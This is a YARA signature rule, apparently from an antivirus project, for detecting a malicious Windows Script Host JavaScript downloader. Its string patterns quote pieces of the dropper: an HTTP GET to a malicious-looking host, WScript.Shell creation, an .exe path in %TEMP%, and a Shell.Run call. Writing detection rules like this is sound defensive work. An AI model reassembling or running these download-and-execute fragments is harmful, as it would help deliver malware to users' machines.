rule sig_20160330_ac3a4fe743d1bbd59357271ebc113a9b {
  meta:
    description = "datamaliciousorder - file 20160330_ac3a4fe743d1bbd59357271ebc113a9b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7c9b33255c780a63dbaafe347bc1f373643cf54734ec3487c9a5fc2370443565"

  strings:
    $s1  = "JB[N1](\"GET\", \"http://be-stlines-tore.com/u3rsap\", false);" fullword ascii
    $s2  = "var MR = function PF() {return WScript[FH](\"WScript\"+\".Shell\");}(), VD = 11;" fullword ascii
    $s3  = "function E(A1, I){C = C * 1; return A1 - I;};" fullword ascii
    $s4  = "if (JB[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function DD() {return MR[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"MUJGMiCUdrWO4sp8.ex\" + \"e\";};" fullword ascii
    $s6  = "function OR(){return P + \"\";};" fullword ascii
    $s7  = "function D() {return ((YB == true) && (YB == OH)) ? 1 : C;};" fullword ascii
    $s8  = "function UC(CG0){MR[\"Run\"](CG0, C, C);};" fullword ascii
    $s9  = "function N()" fullword ascii
    $s10 = "}while (M);" fullword ascii
    $s11 = "return E(EZ, N2);" fullword ascii
    $s12 = "function N0(){return 22;};" fullword ascii
    $s13 = "function NC(MG) {var UC0 = (1, 2, 3, 4, 5, MG); return UC0;};" fullword ascii
    $s14 = "function Q(){return FH;};" fullword ascii
    $s15 = "var ZA = new this[\"Date\"]();" fullword ascii
    $s16 = "var U = false;" fullword ascii
    $s17 = "var OH = false;" fullword ascii
    $s18 = "var YB = false;" fullword ascii
    $s19 = "YB = true; " fullword ascii
    $s20 = "OH = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}